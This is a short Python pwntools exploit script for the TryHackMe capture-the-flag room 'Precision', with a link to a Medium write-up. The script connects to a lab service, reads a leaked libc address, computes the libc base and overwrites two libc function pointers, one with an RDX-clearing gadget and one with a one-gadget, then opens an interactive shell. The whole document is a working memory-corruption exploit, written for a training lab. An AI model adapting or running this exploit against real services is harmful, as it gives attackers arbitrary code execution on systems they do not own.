'''
Room Script: https://tryhackme.com/room/hfb1precision

Medium Article for explanation: https://medium.com/@Sle3pyHead/precision-ctf-notes-tryhackme-90b1f2e0381a
'''

from pwn import *

r = remote('10.201.28.37', 9004)
libc = ELF('./libc.so.6')

r.recvuntil(b'Coordinates: ')
leak = int(r.recvline().strip(), 16)
libc_base = leak - libc.symbols['_IO_2_1_stdout_']

__strlen_avx2 = libc_base + (0x7ffff7fac098 - 0x7ffff7d93000)
__mempcpy_avx_unaligned_erms = libc_base + (0x7ffff7fac040 - 0x7ffff7d93000)

r.sendlineafter(b'>> ', str(__strlen_avx2).encode())
r.send(p64(libc_base + 0x176df7))  # RDX clearing gadget

r.sendlineafter(b'>> ', str(__mempcpy_avx_unaligned_erms).encode())
r.send(p64(libc_base + 0xebcf8))   # One gadget

r.interactive()
